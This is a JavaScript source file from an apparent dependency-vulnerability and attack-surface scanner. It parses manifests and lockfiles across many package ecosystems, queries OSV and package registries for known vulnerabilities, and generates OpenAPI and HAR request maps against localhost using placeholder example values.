function _parseRequirementsTxt(text,filePath){
  const out=[];
  for(const line of text.split('\n')){
    const t=line.trim();
    if(!t||t.startsWith('#')||t.startsWith('-'))continue;
    const m=t.match(/^([A-Za-z0-9_.-]+)\s*[=~<>!]+\s*([^\s;#,]*)/);
    if(m)out.push({name:m[1],version:m[2],group:'',scope:'required',
      purl:_makePurl('pypi',m[1].toLowerCase(),m[2],''),ecosystem:'pypi',filePath,isUnpinned:false});
  }return out;
}

function _parseComposerJson(text,filePath){
  const out=[];try{const d=JSON.parse(text);
    for(const[depKey,scope]of[['require','required'],['require-dev','optional']]){
      for(const[name,verRange]of Object.entries(d[depKey]||{})){
        if(name==='php'||name.startsWith('ext-')||name.startsWith('lib-'))continue;
        const ver=verRange.replace(/^[\^~>=<!\sv*]+/,'').split(/[\s,]/)[0]||'0.0.0';
        const parts=name.split('/');
        const group=parts.length>1?parts[0]:'';
        const pkgName=parts.length>1?parts[1]:name;
        out.push({name,version:ver,group,scope,purl:_makePurl('packagist',pkgName,ver,group),
          ecosystem:'packagist',filePath,isUnpinned:verRange==='*'||verRange===''||verRange.includes('*')});
      }
    }
  }catch(_){}return out;
}

function _parseComposerLock(text,filePath){
  const out=[];try{const d=JSON.parse(text);
    for(const[listKey,scope]of[['packages','required'],['packages-dev','optional']]){
      for(const pkg of d[listKey]||[]){
        const name=pkg.name||'';const ver=(pkg.version||'').replace(/^v/,'');
        if(!name||!ver)continue;
        const parts=name.split('/');
        const group=parts.length>1?parts[0]:'';
        const pkgName=parts.length>1?parts[1]:name;
        out.push({name,version:ver,group,scope,purl:_makePurl('packagist',pkgName,ver,group),
          ecosystem:'packagist',filePath,isUnpinned:false});
      }
    }
  }catch(_){}return out;
}

function _parseGemfile(text,filePath){
  const out=[];
  for(const line of text.split('\n')){
    const t=line.trim();if(!t||t.startsWith('#'))continue;
    const m=t.match(/^\s*gem\s+['"]([^'"]+)['"]\s*(?:,\s*['"]([^'"]+)['"])?/);
    if(m){
      const name=m[1];const verRaw=m[2]||'';
      const ver=verRaw.replace(/^[\^~>=<!\s]+/,'').trim()||'0.0.0';
      out.push({name,version:ver,group:'',scope:'required',purl:_makePurl('rubygems',name,ver,''),
        ecosystem:'rubygems',filePath,isUnpinned:!verRaw||verRaw==='*'||verRaw.startsWith('>')});
    }
  }return out;
}

function _parseGemfileLock(text,filePath){
  const out=[];let inGems=false;
  for(const line of text.split('\n')){
    if(line.startsWith('GEM')){inGems=true;continue;}
    if(inGems&&line.match(/^\S/)&&!line.startsWith(' ')){inGems=false;}
    if(!inGems)continue;
    const m=line.match(/^ {4}([a-zA-Z0-9_\-]+)\s+\(([^)]+)\)/);
    if(m)out.push({name:m[1],version:m[2],group:'',scope:'required',
      purl:_makePurl('rubygems',m[1],m[2],''),ecosystem:'rubygems',filePath,isUnpinned:false});
  }return out;
}

function _parseGoMod(text,filePath){
  const out=[];let inReq=false;
  for(const line of text.split('\n')){
    const t=line.trim();if(!t||t.startsWith('//'))continue;
    if(t.startsWith('require (')){inReq=true;continue;}
    if(t===')'){inReq=false;continue;}
    let m=inReq?t.match(/^([^\s]+)\s+v([^\s/]+)/):t.match(/^require\s+([^\s]+)\s+v([^\s/]+)/);
    if(m){
      const name=m[1];const ver=m[2].replace(/-.*$/,'');
      const isIndirect=t.includes('// indirect');
      out.push({name,version:ver,group:name.split('/').slice(0,2).join('/'),
        scope:isIndirect?'optional':'required',purl:_makePurl('golang',name,ver,''),
        ecosystem:'golang',filePath,isUnpinned:false});
    }
  }return out;
}

function _parseCargoToml(text,filePath){
  const out=[];let section='';
  for(const line of text.split('\n')){
    const t=line.trim();if(!t||t.startsWith('#'))continue;
    const secM=t.match(/^\[([^\]]+)\]/);if(secM){section=secM[1];continue;}
    if(!section.includes('dependencies'))continue;
    const scope=section==='dev-dependencies'?'optional':'required';
    const simple=t.match(/^([a-zA-Z0-9_\-]+)\s*=\s*"([^"]+)"/);
    if(simple){
      const ver=simple[2].replace(/^[\^~>=<\s*]+/,'').split(',')[0].trim();
      out.push({name:simple[1],version:ver,group:'',scope,purl:_makePurl('cargo',simple[1],ver,''),
        ecosystem:'cargo',filePath,isUnpinned:ver==='*'||ver===''});continue;
    }
    const tbl=t.match(/^([a-zA-Z0-9_\-]+)\s*=\s*\{[^}]*version\s*=\s*"([^"]+)"/);
    if(tbl){
      const ver=tbl[2].replace(/^[\^~>=<\s*]+/,'').split(',')[0].trim();
      out.push({name:tbl[1],version:ver,group:'',scope,purl:_makePurl('cargo',tbl[1],ver,''),
        ecosystem:'cargo',filePath,isUnpinned:ver==='*'||ver===''});
    }
  }return out;
}

function _parseCargoLock(text,filePath){
  const out=[];let cur={};
  for(const line of text.split('\n')){
    const t=line.trim();
    if(t==='[[package]]'){
      if(cur.name&&cur.version)out.push({name:cur.name,version:cur.version,group:'',scope:'required',
        purl:_makePurl('cargo',cur.name,cur.version,''),ecosystem:'cargo',filePath,isUnpinned:false});
      cur={};continue;
    }
    const m=t.match(/^(name|version)\s*=\s*"([^"]+)"/);if(m)cur[m[1]]=m[2];
  }
  if(cur.name&&cur.version)out.push({name:cur.name,version:cur.version,group:'',scope:'required',
    purl:_makePurl('cargo',cur.name,cur.version,''),ecosystem:'cargo',filePath,isUnpinned:false});
  return out;
}

function _parsePomXml(text,filePath){
  const out=[];
  for(const block of text.matchAll(/<dependency>([\s\S]*?)<\/dependency>/g)){
    const inner=block[1];
    const gM=inner.match(/<groupId>([^<]+)<\/groupId>/);
    const aM=inner.match(/<artifactId>([^<]+)<\/artifactId>/);
    const vM=inner.match(/<version>([^<]+)<\/version>/);
    const sM=inner.match(/<scope>([^<]+)<\/scope>/);
    if(!gM||!aM)continue;
    const group=gM[1].trim();const artifact=aM[1].trim();
    const ver=vM?vM[1].trim().replace(/^\$\{[^}]+\}$/,'0.0.0'):'0.0.0';
    const scope=sM&&(sM[1]==='test'||sM[1]==='provided')?'optional':'required';
    out.push({name:`${group}:${artifact}`,version:ver,group,scope,
      purl:_makePurl('maven',artifact,ver,group),ecosystem:'maven',filePath,
      isUnpinned:ver==='0.0.0'||ver.startsWith('$')});
  }return out;
}

function _parseBuildGradle(text,filePath){
  const out=[];
  const pat=/(?:implementation|api|compile|runtimeOnly|testImplementation|testCompile|compileOnly|classpath)\s*(?:\(|['"])\s*['"]?([a-zA-Z0-9._\-]+):([a-zA-Z0-9._\-]+):([^'")\s,]+)/g;
  let m;while((m=pat.exec(text))!==null){
    const group=m[1];const artifact=m[2];
    const ver=m[3].replace(/^[\^~>=<\s]+/,'').trim();
    const scope=m[0].trimStart().startsWith('test')?'optional':'required';
    out.push({name:`${group}:${artifact}`,version:ver,group,scope,
      purl:_makePurl('maven',artifact,ver,group),ecosystem:'maven',filePath,
      isUnpinned:ver.startsWith('$')||ver==='+'});
  }return out;
}

function _parseYarnLock(text,filePath){
  const out=[];const seen=new Set();
  for(const block of text.split(/\n\n+/)){
    if(!block.trim()||block.trim().startsWith('#'))continue;
    const lines=block.split('\n');
    if(!lines[0]||lines[0].startsWith(' '))continue;
    const nameM=lines[0].match(/^"?(@?[^@"]+)@/);
    const verM=block.match(/^\s+version[: ]+["']?([^\s"'\n]+)["']?/m);
    if(!nameM||!verM)continue;
    const name=nameM[1].trim();const ver=verM[1];
    const key=`${name}@${ver}`;if(seen.has(key))continue;seen.add(key);
    const scoped=name.startsWith('@');
    const parts=scoped?name.slice(1).split('/'):['',name];
    const group=scoped?`@${parts[0]}`:'';const pkgName=scoped?parts[1]:name;
    out.push({name,version:ver,group,scope:'required',purl:_makePurl('npm',pkgName,ver,group),
      ecosystem:'npm',filePath,isUnpinned:false});
  }return out;
}

function _parsePnpmLock(text,filePath){
  const out=[];const seen=new Set();
  // Matches both v5 (/name/version:) and v6+ (/name@version:) package entries
  const re=/^\s+\/((?:@[^/@\s]+\/)?[^/@\s]+)[@/]([0-9][^:\s(_]*)/gm;
  let m;while((m=re.exec(text))!==null){
    const name=m[1];const ver=m[2];
    if(!ver||!/^\d/.test(ver))continue;
    const key=`${name}@${ver}`;if(seen.has(key))continue;seen.add(key);
    const scoped=name.startsWith('@');
    const parts=scoped?name.slice(1).split('/'):['',name];
    const group=scoped?`@${parts[0]}`:'';const pkgName=scoped?parts[1]:name;
    out.push({name,version:ver,group,scope:'required',purl:_makePurl('npm',pkgName,ver,group),
      ecosystem:'npm',filePath,isUnpinned:false});
  }return out;
}

function _parsePoetryLock(text,filePath){
  const out=[];
  for(const block of text.split(/\[\[package\]\]/)){
    const nameM=block.match(/^name\s*=\s*"([^"]+)"/m);
    const verM=block.match(/^version\s*=\s*"([^"]+)"/m);
    const optM=block.match(/^optional\s*=\s*(true|false)/m);
    if(!nameM||!verM)continue;
    const name=nameM[1];const ver=verM[1];
    const scope=optM&&optM[1]==='true'?'optional':'required';
    out.push({name,version:ver,group:'',scope,purl:_makePurl('pypi',name.toLowerCase(),ver,''),
      ecosystem:'pypi',filePath,isUnpinned:false});
  }return out;
}

function _parsePyprojectToml(text,filePath){
  const out=[];const seen=new Set();
  const add=(name,verRaw,scope)=>{
    const ver=verRaw.replace(/^[\^~>=<!\s*]+/,'').split(/[,\s]/)[0].trim()||'0.0.0';
    if(!name||name==='python'||seen.has(name))return;seen.add(name);
    out.push({name,version:ver,group:'',scope,purl:_makePurl('pypi',name.toLowerCase(),ver,''),
      ecosystem:'pypi',filePath,isUnpinned:ver==='0.0.0'||verRaw.includes('*')});
  };
  // Poetry: [tool.poetry.dependencies] / [tool.poetry.dev-dependencies] / [tool.poetry.group.*.dependencies]
  for(const[re,scope]of[
    [/\[tool\.poetry\.dependencies\]([\s\S]*?)(?=\n\[)/m,'required'],
    [/\[tool\.poetry\.(?:dev-dependencies|group\.[^.\]]+\.dependencies)\]([\s\S]*?)(?=\n\[)/m,'optional']
  ]){
    const secM=text.match(re);if(!secM)continue;
    for(const line of secM[1].split('\n')){
      const t=line.trim();if(!t||t.startsWith('#'))continue;
      const m=t.match(/^([a-zA-Z0-9_\-]+)\s*=\s*(?:"([^"]*)"|'([^']*)'|\{[^}]*version\s*=\s*"([^"]+)")/);
      if(m)add(m[1],m[2]||m[3]||m[4]||'',scope);
    }
  }
  // PEP 621: [project] dependencies = ["pkg>=1.0"]
  const pep=text.match(/\[project\]([\s\S]*?)(?=\n\[(?!project\.))/m);
  if(pep){
    const dM=pep[1].match(/^dependencies\s*=\s*\[([\s\S]*?)\]/m);
    if(dM)for(const item of dM[1].split(',')){
      const t=item.trim().replace(/^["'\s]+|["'\s]+$/g,'');
      const m=t.match(/^([a-zA-Z0-9_\-]+)[>=<!^~\s].*?([0-9][0-9.]*)/);
      if(m)add(m[1],m[2],'required');
    }
  }
  return out;
}

function _parsePipfileLock(text,filePath){
  const out=[];try{const d=JSON.parse(text);
    for(const[section,scope]of[['default','required'],['develop','optional']]){
      for(const[name,info]of Object.entries(d[section]||{})){
        if(name==='_meta')continue;
        const verRaw=info.version||'';
        const ver=verRaw.replace(/^[=!<>^~\s]+/,'').trim()||'0.0.0';
        out.push({name,version:ver,group:'',scope,purl:_makePurl('pypi',name.toLowerCase(),ver,''),
          ecosystem:'pypi',filePath,isUnpinned:!verRaw});
      }
    }
  }catch(_){}return out;
}

function _parsePubspecYaml(text,filePath){
  const out=[];const seen=new Set();let section='';
  for(const line of text.split('\n')){
    const t=line.trim();if(!t||t.startsWith('#'))continue;
    if(t==='dependencies:'||t==='dev_dependencies:'){section=t;continue;}
    if(t&&!line.startsWith(' ')&&!line.startsWith('\t')){section='';continue;}
    if(!section)continue;
    if(t==='sdk: flutter'||t==='sdk: dart'||t==='flutter:'||t==='dart:')continue;
    const scope=section==='dev_dependencies:'?'optional':'required';
    const m=line.match(/^\s+([a-zA-Z0-9_]+):\s*['"]?[^{]([0-9][^\s'"]*)/);
    if(m&&!seen.has(m[1])){
      const ver=m[2].replace(/^[\^~>=<\s]+/,'').trim();
      seen.add(m[1]);
      out.push({name:m[1],version:ver,group:'',scope,purl:_makePurl('pub',m[1],ver,''),
        ecosystem:'pub',filePath,isUnpinned:false});
    }
  }return out;
}

function _parsePubspecLock(text,filePath){
  const out=[];
  for(const block of text.split(/\n  (?=[a-zA-Z0-9_])/)){
    const nameM=block.match(/^([a-zA-Z0-9_]+):\s*\n/);
    const verM=block.match(/version:\s*["']?([0-9][^"'\s]*)["']?/);
    const depM=block.match(/dependency:\s*["']([^"']+)["']/);
    if(!nameM||!verM)continue;
    const scope=depM&&depM[1].includes('dev')?'optional':'required';
    out.push({name:nameM[1],version:verM[1],group:'',scope,
      purl:_makePurl('pub',nameM[1],verM[1],''),ecosystem:'pub',filePath,isUnpinned:false});
  }return out;
}

function parseManifests(allFileContents){
  const PARSERS={'package.json':_parsePackageJson,'package-lock.json':_parsePackageLockJson,'yarn.lock':_parseYarnLock,'pnpm-lock.yaml':_parsePnpmLock,'requirements.txt':_parseRequirementsTxt,'pyproject.toml':_parsePyprojectToml,'poetry.lock':_parsePoetryLock,'Pipfile.lock':_parsePipfileLock,'composer.json':_parseComposerJson,'composer.lock':_parseComposerLock,'Gemfile':_parseGemfile,'Gemfile.lock':_parseGemfileLock,'go.mod':_parseGoMod,'Cargo.toml':_parseCargoToml,'Cargo.lock':_parseCargoLock,'pom.xml':_parsePomXml,'build.gradle':_parseBuildGradle,'build.gradle.kts':_parseBuildGradle,'pubspec.yaml':_parsePubspecYaml,'pubspec.lock':_parsePubspecLock};
  const out=[],seen=new Set();
  for(const[fp,content]of Object.entries(allFileContents)){
    const base=fp.split('/').pop();
    if(!PARSERS[base])continue;
    for(const comp of PARSERS[base](content,fp)){
      const key=`${comp.ecosystem}:${comp.name}:${comp.version}`;
      if(!seen.has(key)){seen.add(key);out.push(comp);}
    }
  }return out;
}

function buildReachabilitySet(fc){
  const imported=new Set();
  const byFile=new Map();
  const srcExts=new Set(['.js','.jsx','.ts','.tsx','.py']);
  const normPkg=raw=>{const parts=raw.split('/');return(raw.startsWith('@')&&parts.length>=2?`${parts[0]}/${parts[1]}`:parts[0]).toLowerCase();};
  const addAlias=(fp,alias,pkg)=>{if(!alias||!pkg)return;if(!byFile.has(fp))byFile.set(fp,new Map());byFile.get(fp).set(alias,pkg);};
  for(const[fp,content]of Object.entries(fc)){
    if(['node_modules','vendor','dist','build'].some(d=>fp.includes('/'+d+'/')||fp.startsWith(d+'/')))continue;
    const ext=fp.slice(fp.lastIndexOf('.')).toLowerCase();
    if(!srcExts.has(ext))continue;
    if(ext==='.py'){
      // import pkg / import pkg as alias
      for(const m of content.matchAll(/^\s*import\s+([a-zA-Z0-9_]+)(?:\s+as\s+([a-zA-Z0-9_]+))?/gm)){const pkg=m[1].toLowerCase();imported.add(pkg);addAlias(fp,m[2]||m[1],pkg);}
      // from pkg import name [as alias], name2 [as alias2]
      for(const m of content.matchAll(/^\s*from\s+([a-zA-Z0-9_.]+)\s+import\s+([^\n#]+)/gm)){
        const pkg=m[1].split('.')[0].toLowerCase();imported.add(pkg);
        for(const im of m[2].split(',')){const p=im.trim().match(/^([a-zA-Z0-9_*]+)(?:\s+as\s+([a-zA-Z0-9_]+))?/);if(p)addAlias(fp,p[2]||p[1],pkg);}
      }
    }else{
      // const X = require('pkg') or const {a,b} = require('pkg')
      for(const m of content.matchAll(/(?:const|let|var)\s+(\{[^}]+\}|[a-zA-Z0-9_$]+)\s*=\s*require\s*\(\s*['"]([^'"./][^'"]*)['"]\s*\)/g)){
        const pkg=normPkg(m[2]);imported.add(pkg);
        if(m[1].startsWith('{')){for(const n of m[1].slice(1,-1).split(',')){const p=n.trim().match(/^([a-zA-Z0-9_$]+)(?:\s*:\s*([a-zA-Z0-9_$]+))?/);if(p)addAlias(fp,p[2]||p[1],pkg);}}
        else addAlias(fp,m[1],pkg);
      }
      // import X from 'pkg'  /  import * as X from 'pkg'  /  import {a, b as c} from 'pkg'
      for(const m of content.matchAll(/import\s+(?:(\*\s+as\s+[a-zA-Z0-9_$]+)|(\{[^}]+\})|([a-zA-Z0-9_$]+)(?:\s*,\s*(\{[^}]+\}|\*\s+as\s+[a-zA-Z0-9_$]+))?)\s+from\s+['"]([^'"./][^'"]*)['"]/g)){
        const pkg=normPkg(m[5]);imported.add(pkg);
        if(m[1]){const a=m[1].match(/as\s+([a-zA-Z0-9_$]+)/);if(a)addAlias(fp,a[1],pkg);}
        if(m[3])addAlias(fp,m[3],pkg);
        const named=m[2]||(m[4]&&m[4].startsWith('{')?m[4]:null);
        if(named){for(const n of named.slice(1,-1).split(',')){const p=n.trim().match(/^([a-zA-Z0-9_$]+)(?:\s+as\s+([a-zA-Z0-9_$]+))?/);if(p)addAlias(fp,p[2]||p[1],pkg);}}
        if(m[4]&&m[4].startsWith('*')){const a=m[4].match(/as\s+([a-zA-Z0-9_$]+)/);if(a)addAlias(fp,a[1],pkg);}
      }
      // bare imports without local binding: import 'pkg' (no alias, still count as imported)
      for(const m of content.matchAll(/import\s+['"]([^'"./][^'"]*)['"]/g)){imported.add(normPkg(m[1]));}
    }
  }
  return{imported,byFile};
}

function computeExploitPathComponents(findings,components,byFile){
  const flagged=new Set();
  const pathsByKey=new Map();
  const realFindings=(findings||[]).filter(f=>!f.isSanitized&&f.severity!=="info");
  if(!realFindings.length)return{flagged,pathsByKey};
  for(const c of components){
    const key=`${c.ecosystem}:${c.name}:${c.version}`;
    const pkgLower=c.name.toLowerCase();
    const matches=[];
    for(const f of realFindings){
      const files=String(f.file||"").split(" -> ");
      const snippets=[f.source?.snippet||"",f.sink?.snippet||"",...(f.path||[]).map(p=>p.snippet||"")].join(" ");
      let matched=false;
      for(const fp of files){
        const aliases=byFile.get(fp);if(!aliases)continue;
        for(const[alias,pkg]of aliases){
          if(pkg!==pkgLower)continue;
          const safe=alias.replace(/[.*+?^${}()|[\]\\]/g,"\\$&");
          const re=new RegExp(`(?:^|[^\\w$])${safe}(?:[^\\w$]|$)`);
          if(re.test(snippets)){matched=true;break;}
        }
        if(matched)break;
      }
      if(matched)matches.push(f);
    }
    if(matches.length){flagged.add(key);pathsByKey.set(key,matches.slice(0,10));}
  }
  return{flagged,pathsByKey};
}

async function queryOSV(components,allFileContents){
  const OSV_ECO={npm:'npm',pypi:'PyPI',packagist:'Packagist',rubygems:'RubyGems',golang:'Go',cargo:'crates.io',maven:'Maven',pub:'Pub'};
  const results=[];
  const queryable=components.filter(c=>OSV_ECO[c.ecosystem]&&c.version&&/\d+\.\d+/.test(c.version));
  if(!queryable.length){
    // still check unpinned / no-lockfile even when nothing to query
    for(const c of components.filter(c=>c.isUnpinned))
      results.push({type:'unpinned_dep',name:c.name,version:c.version,file:c.filePath,severity:'medium'});
    return results;
  }

  const queries=[],uncached=[],vulnAffects={};
  for(const comp of queryable){
    const eco=OSV_ECO[comp.ecosystem];
    const cleanVer=(comp.version.match(/(\d+\.\d+(?:\.\d+)*)/)||[])[1];
    if(!cleanVer)continue;
    const ck=`comp:${eco}:${comp.name}:${cleanVer}`;
    const cached=_osvCacheGet(ck);
    if(cached!==null){
      for(const vid of cached){if(!vulnAffects[vid])vulnAffects[vid]=[];vulnAffects[vid].push(comp);}
    }else{
      queries.push({version:cleanVer,package:{name:comp.name,ecosystem:eco}});
      uncached.push({comp,ck});
    }
  }

  if(queries.length){
    for(let i=0;i<queries.length;i+=1000){
      const chunkQ=queries.slice(i,i+1000),chunkC=uncached.slice(i,i+1000);
      try{
        const resp=await fetch('https://api.osv.dev/v1/querybatch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({queries:chunkQ})});
        const data=await resp.json();
        for(let idx=0;idx<(data.results||[]).length;idx++){
          const{comp,ck}=chunkC[idx];
          const vids=(data.results[idx].vulns||[]).map(v=>v.id).filter(Boolean);
          _osvCacheSet(ck,vids);
          for(const vid of vids){if(!vulnAffects[vid])vulnAffects[vid]=[];vulnAffects[vid].push(comp);}
        }
      }catch(_){/* OSV unreachable, use whatever was cached */}
    }
  }

  for(const[vid,affectedComps]of Object.entries(vulnAffects)){
    let vuln=_osvCacheGet('vuln:'+vid);
    if(!vuln){
      try{
        const resp=await fetch(`https://api.osv.dev/v1/vulns/${vid}`);
        const d=await resp.json();
        const fixedVersions=new Set();
        for(const aff of(d.affected||[]))for(const rng of(aff.ranges||[]))for(const ev of(rng.events||[]))if(ev.fixed)fixedVersions.add(ev.fixed);
        let severity='medium';
        const db=d.database_specific||{};
        if(db.severity)severity=db.severity.toLowerCase()==='moderate'?'medium':db.severity.toLowerCase();
        let cvssVector=null;
        for(const s of(d.severity||[]))if(s.type==='CVSS_V3'||s.type==='CVSS_V4'){cvssVector=s.score;break;}
        const hasKnownExploit=(d.references||[]).some(r=>['exploit-db','packetstorm','/poc','/0day'].some(x=>(r.url||'').toLowerCase().includes(x)));
        vuln={id:vid,description:(d.summary||d.details||'No description.').slice(0,300),
          fixedVersions:[...fixedVersions].sort(),
          aliases:(d.aliases||[]).filter(a=>a.startsWith('CVE-')),
          severity,cvssVector,hasKnownExploit};
        _osvCacheSet('vuln:'+vid,vuln);
      }catch(_){continue;}
    }
    for(const comp of affectedComps){
      const cveStr=vuln.aliases.length?` (${vuln.aliases[0]})`:'';
      const fixStr=vuln.fixedVersions.length?vuln.fixedVersions[0]:null;
      results.push({type:'vulnerable_dep',name:comp.name,version:comp.version,ecosystem:comp.ecosystem,
        purl:comp.purl,osvId:vid,cveAliases:vuln.aliases,description:vuln.description,
        fixedVersions:vuln.fixedVersions,severity:vuln.severity,cvssVector:vuln.cvssVector,
        hasKnownExploit:vuln.hasKnownExploit,reachable:comp.reachable,scope:comp.scope,
        file:comp.filePath,
        // kept for generateRecs() compat
        advisory:`${vid}${cveStr}, ${vuln.description}`,
        range:fixStr?`< ${fixStr}`:'see advisory'});
    }
  }

  // Unpinned deps
  for(const c of components.filter(c=>c.isUnpinned))
    results.push({type:'unpinned_dep',name:c.name,version:c.version,file:c.filePath,severity:'medium'});

  // No-lockfile check
  const hasNpmManifest=components.some(c=>c.ecosystem==='npm'&&!c.filePath.endsWith('package-lock.json'));
  const hasLock=Object.keys(allFileContents).some(fp=>{const b=fp.split('/').pop();return['package-lock.json','yarn.lock','pnpm-lock.yaml'].includes(b);});
  if(hasNpmManifest&&!hasLock){
    const mf=components.find(c=>c.ecosystem==='npm'&&c.filePath.endsWith('package.json'));
    results.push({type:'no_lockfile',file:mf?.filePath||'package.json',severity:'high'});
  }

  // CDN without SRI & dynamic require (non-OSV structural checks kept here)
  for(const[fp,content]of Object.entries(allFileContents)){
    const scriptRe=/<script\b[^>]*src\s*=\s*["']https?:\/\/(?:cdn|cdnjs|unpkg|jsdelivr)[^"']+["'][^>]*>/gi;
    let sm;while((sm=scriptRe.exec(content))){if(!sm[0].includes('integrity')){const line=content.substring(0,sm.index).split('\n').length;results.push({type:'cdn_no_integrity',file:fp,line,snippet:sm[0].substring(0,120),severity:'medium'});}}
    const dynRe=/require\s*\(\s*(?:\w+|`[^`]*\$\{)/g;let dm;while((dm=dynRe.exec(content))){const line=content.substring(0,dm.index).split('\n').length;const lt=content.split('\n')[line-1]?.trim()||'';if(!lt.includes('path.')&&!lt.includes('__dirname'))results.push({type:'dynamic_require',file:fp,line,snippet:lt,severity:'medium'});}
  }
  return results;
}

function exampleForField(name,cls=[]){const n=(name||"").toLowerCase();if(cls.includes("PCI")||/card|pan|cvv|cvc|expiry|ccnum/.test(n))return "4111111111111111";if(cls.includes("PHI")||/ssn|social.*security|dob|birth/.test(n))return "123-45-6789";if(/email/.test(n))return "user@example.com";if(/password|passwd|pwd|secret/.test(n))return "Passw0rd!";if(/token|jwt|bearer|auth/.test(n))return "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMSJ9.test";if(/phone|mobile|tel/.test(n))return "+1-555-555-5555";if(/name|first|last/.test(n))return "John Doe";if(/id$|_id$|^id/.test(n))return "1";if(/url|link|href/.test(n))return "http://example.com";if(/file|path/.test(n))return "document.pdf";if(/amount|price|cost/.test(n))return "9.99";if(/date|time/.test(n))return "2024-01-01";if(/search|query|q$/.test(n))return "test";if(/page|offset|limit/.test(n))return "1";return "value";}

function genOpenAPI(routes,sources){const paths={};for(const r of routes){if(r.path==="(file-based)")continue;const p=r.path.replace(/:(\w+)/g,"{$1}").replace(/<(\w+)(?::[^>]+)?>/g,"{$1}");if(!p.startsWith("/"))continue;if(!paths[p])paths[p]={};const method=r.method.toLowerCase();if(paths[p][method])continue;const pp=[...p.matchAll(/\{(\w+)\}/g)].map(m=>{const cls=classifyField(m[1]);return{name:m[1],in:"path",required:true,schema:{type:"string",example:exampleForField(m[1],cls)},classifications:cls};});const rp=sources.filter(s=>s.file===r.file&&s.variable);const qp=rp.filter(s=>s.inputType==="query"||s.category.includes("Param")).map(s=>{const cls=classifyField(s.variable);return{name:s.variable,in:"query",required:false,schema:{type:"string",example:exampleForField(s.variable,cls)},classifications:cls};});const seen=new Set();const ap=[...pp,...qp].filter(x=>{if(seen.has(x.name))return false;seen.add(x.name);return true;});const op={summary:`${r.method} ${r.path}`,tags:[r.framework],responses:{"200":{description:"Success"}},hasAuth:r.hasAuth,"x-data-classifications":r.classifications,"x-classified-fields":r.classifiedFields||{}};if(ap.length)op.parameters=ap;if(["post","put","patch"].includes(method)){const bp=rp.filter(s=>s.inputType==="body"||s.inputType==="http");const props={};bp.forEach(b=>{const cls=classifyField(b.variable);const ex=exampleForField(b.variable,cls);props[b.variable]={type:"string",example:ex};if(cls.length)props[b.variable]["x-classifications"]=cls;});if(r.hasFileUpload){const mpProps={...props,file:{type:"string",format:"binary",description:"Uploaded file"}};op.requestBody={content:{"multipart/form-data":{schema:{type:"object",properties:mpProps}}}};}else if(bp.length){op.requestBody={content:{"application/json":{schema:{type:"object",properties:props}}}};}}paths[p][method]=op;};return{openapi:"3.1.0",jsonSchemaDialect:"https://spec.openapis.org/oas/3.1/dialect/base",info:{title:"Code Boundaries API",version:"1.0.0",summary:"Auto-generated attack surface map"},servers:[{url:"http://localhost:3000"}],paths};}

function genHAR(routes,sources){const baseUrl="http://localhost:3000";const entries=[];for(const r of routes){if(r.path==="(file-based)")continue;const p=r.path.replace(/:(\w+)/g,"$1_example").replace(/<(\w+)(?::[^>]+)?>/g,"$1_example");const method=r.method.toUpperCase();const rp=sources.filter(s=>s.file===r.file&&s.variable);const qParams=rp.filter(s=>s.inputType==="query"||s.category.includes("Param")).map(s=>({name:s.variable,value:exampleForField(s.variable,classifyField(s.variable))}));const qStr=qParams.length?"?"+qParams.map(q=>`${encodeURIComponent(q.name)}=${encodeURIComponent(q.value)}`).join("&"):"";const url=`${baseUrl}${p.startsWith("/")?p:"/"+p}${qStr}`;const headers=[{name:"Content-Type",value:"application/json"},{name:"Accept",value:"application/json"},{name:"User-Agent",value:"Mozilla/5.0 (AttackSurface Scanner)"}];if(r.hasAuth)headers.push({name:"Authorization",value:"Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMSJ9.test"});let postData=null;if(["POST","PUT","PATCH"].includes(method)){const bp=rp.filter(s=>s.inputType==="body"||s.inputType==="http");const body={};bp.forEach(b=>{body[b.variable]=exampleForField(b.variable,classifyField(b.variable));});if(Object.keys(body).length){postData={mimeType:"application/json",text:JSON.stringify(body)};}else{postData={mimeType:"application/json",text:"{}"};}}const entry={startedDateTime:new Date().toISOString(),time:0,request:{method,url,httpVersion:"HTTP/1.1",headers,queryString:qParams,cookies:[],headersSize:-1,bodySize:postData?postData.text.length:0,...(postData?{postData}:{})},response:{status:200,statusText:"OK",httpVersion:"HTTP/1.1",headers:[{name:"Content-Type",value:"application/json"}],cookies:[],content:{size:2,mimeType:"application/json",text:"{}"},redirectURL:"",headersSize:-1,bodySize:2},cache:{},timings:{send:0,wait:0,receive:0}};entries.push(entry);}return{log:{version:"1.2",creator:{name:"AttackSurface Scanner",version:"1.0"},entries}};}

async function queryRegistries(components){
  const infoMap=new Map();
  const npmNames=[...new Set(components.filter(c=>c.ecosystem==='npm').map(c=>c.name))];
  const pypiNames=[...new Set(components.filter(c=>c.ecosystem==='pypi').map(c=>c.name))];
  const CHUNK=8;
  for(let i=0;i<npmNames.length;i+=CHUNK){
    await Promise.all(npmNames.slice(i,i+CHUNK).map(async name=>{
      try{
        const resp=await fetch('https://registry.npmjs.org/'+name);
        if(!resp.ok)return;
        const d=await resp.json();
        const latest=d['dist-tags']?.latest||'';const lic=d.license||(latest&&d.versions?.[latest]?.license)||'';infoMap.set('npm:'+name,{latestVersion:latest,license:lic,versions:d.versions||{}});
      }catch(_){}
    }));
  }
  for(let i=0;i<pypiNames.length;i+=CHUNK){
    await Promise.all(pypiNames.slice(i,i+CHUNK).map(async name=>{
      try{
        const resp=await fetch('https://pypi.org/pypi/'+encodeURIComponent(name)+'/json');
        if(!resp.ok)return;
        const d=await resp.json();
        infoMap.set('pypi:'+name,{latestVersion:d.info?.version||'',license:d.info?.license||'',versions:{}});
      }catch(_){}
    }));
  }
  return infoMap;
}


// Node port: takes { fileContents, depFileContents } maps directly instead of a JSZip object.
// fileContents = code files keyed by relative path; depFileContents = manifest/lockfiles keyed by relative path.
